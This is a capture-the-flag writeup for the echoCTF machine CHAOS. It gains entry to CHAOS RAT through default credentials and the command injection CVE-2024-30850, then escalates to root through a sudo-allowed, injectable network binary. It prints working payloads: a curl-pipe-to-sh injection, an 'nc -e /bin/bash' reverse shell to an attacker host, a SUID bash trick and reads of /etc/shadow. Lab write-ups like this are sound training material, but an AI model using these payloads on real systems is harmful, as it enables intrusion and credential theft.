
# CHAOS — echoCTF Writeup
---

## Recon

```bash
nmap -sS 10.0.160.213
```

Two ports open: **22** (SSH) and **8080** (HTTP).

---

## Enumeration

Visiting `http://10.0.160.213:8080` landed on a login page. Directory fuzzing with `gobuster` revealed the following endpoints:

```
profile  health  logout  shell  settings  devices  explorer  command  generate
```

Before attempting to brute force the login, I checked the GitHub repository and found that the app was **CHAOS RAT v5.0.1** — and that this exact version ships with documented default credentials in its `README.md`:

```
username: admin
password: changeme
```

This version is also known to be vulnerable to remote code execution via **CVE-2024-30850**.

---

## Exploitation

After logging in, I noticed a `/generate` endpoint that allows you to register a server address for agent connections. This is where the vulnerability lives — the address field is injected into a shell command server-side with insufficient sanitization.

I set up three terminal sessions:

**Terminal 1 — payload server:**
```bash
echo "nc -e /bin/bash <ATTACKER_IP> 4444" > shell.sh
python3 -m http.server 8081
```

**Terminal 2 — listener:**
```bash
nc -lnvp 4444
```

**Terminal 3 — trigger the injection:**

First, authenticate and save the session cookie:
```bash
curl -s -X POST http://10.0.160.213:8080/auth \
  -F "username=admin" \
  -F "password=changeme" \
  -c cookies.txt
```

Then fire the payload:
```bash
curl -s -X POST http://10.0.160.213:8080/generate \
  -b cookies.txt \
  --form-string "address=http://localhost'\$(IFS=];b=curl]<ATTACKER_IP>:8081/shell.sh;\$b|sh)'" \
  --form-string "port=8080" \
  --form-string "os_target=2" \
  --form-string "filename=" \
  --form-string "run_hidden=false"
```

 
Alternatively, you can do this directly through the web UI — navigate to `/generate`, paste the address below, select **Linux** as the OS target, leave the port empty, and click **Build**:

```
http://localhost'$(IFS=];b=curl]<ATTACKER_IP>:8081/shell.sh;$b|sh)'
```

After a few seconds, check Terminal 2 — you should have a shell as `ETSCTF`.

**Stabilize the shell:**
```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
```

---

## Privilege Escalation

```bash
sudo -l
```

Output:
```
(ALL : ALL) NOPASSWD: /usr/local/bin/network
```

`/usr/local/bin/network` is a Node.js binary using the `network` npm package, which is vulnerable to arbitrary command injection via `mac_address_for` — it passes the interface name directly into a shell command without sanitization.

```bash
sudo /usr/local/bin/network mac_address_for "eth0; cp /bin/bash /tmp/shell && chmod +s /tmp/shell; #"
/tmp/shell -p
```

This copies bash to `/tmp/shell`, sets the SUID bit (so it runs as root regardless of who executes it), and the `#` comments out anything the binary appends after our input. Running `/tmp/shell -p` preserves the elevated privileges instead of dropping them.

**We are root.**

---

## Flags

The target hints tell us there are 4 flags — 2 system, 1 env, 1 root:

```bash
cat /etc/passwd   # system flag 1
cat /etc/shadow   # system flag 2
env               # env flag
ls -la /root      # root flag (embedded in filename)
```
